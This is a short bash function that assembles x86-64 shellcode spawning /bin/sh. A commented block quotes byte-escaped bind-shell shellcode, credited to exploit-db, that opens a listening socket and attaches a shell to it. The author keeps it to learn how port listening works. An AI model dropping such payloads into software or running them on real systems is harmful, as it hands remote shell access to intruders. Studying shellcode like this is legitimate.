function bind()
{
	# I have found this shell code only and it seems to be a BIND exploit
	# I believe it can be useful to learn how to listen a port:
	local code="";
	code="${code}$(xor rax rax)";
	code="${code}$(mov rdx rax)";
	code="${code}$(mov rsi rax)";
	code="${code}$(prefix rdi)8d3d04000000";# lea rdi,[rel 0xb]
	code="${code}$(add al ${SYS_EXECVE})";
	code="${code}${SYSCALL}";
	code="${code}2f62696e2f736800cc909090";
#  https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.
#
# https://www.exploit-db.com/exploits/41128
#  "$(prefix | xd2esc)\x31\xc0"
#  "$(prefix | xd2esc)\x31\xd2"
#  "$(prefix | xd2esc)\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f"
#  "\x0f\x05"
#  "$(prefix | xd2esc)\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a"
#  "\x0f\x05"
#  "\x5e\x6a\x32\x58"
#  "\x0f\x05"
#  "\x6a\x2b\x58"
#  "\x0f\x05"
#  "$(prefix | xd2esc)\x97\x6a\x03\x5e\xff\xce\xb0\x21"
#  "\x0f\x05"
#  "\x75\xf8\xf7\xe6\x52$(rex)\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53$(rex)\x8d\x3c\x24\xb0\x3b"
#  "\x0f\x05";
  :
}
